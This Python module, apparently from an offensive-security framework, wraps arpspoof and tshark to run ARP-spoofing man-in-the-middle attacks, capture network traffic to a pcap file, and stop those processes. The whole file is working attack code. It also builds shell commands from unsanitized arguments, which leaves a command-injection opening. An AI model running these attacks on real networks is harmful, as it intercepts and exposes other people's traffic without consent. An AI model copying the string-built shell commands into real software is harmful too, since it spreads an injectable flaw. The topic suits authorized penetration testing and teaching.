from ..system import SystemControl

class NetworkAttackModule:
    """
    Handles Network-layer attacks: MITM, Sniffing, Spoofing.
    """
    def __init__(self, system_control):
        self.system = system_control

    def arp_spoof(self, target_ip, gateway_ip, interface):
        """
        Uses arpspoof (dsniff package).
        """
        # arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
        cmd = f"arpspoof -i {interface} -t {target_ip} {gateway_ip}"
        # This blocks, so we spawn it.
        return self.system.spawn_process(cmd)

    def packet_capture(self, interface, output_file="capture.pcap", duration=30):
        """
        Uses tshark or tcpdump.
        """
        # tshark -i eth0 -a duration:30 -w output.pcap
        cmd = f"tshark -i {interface} -a duration:{duration} -w {output_file}"
        return self.system.spawn_process(cmd)

    def stop_attack(self, pid):
        return self.system.kill_process(pid)
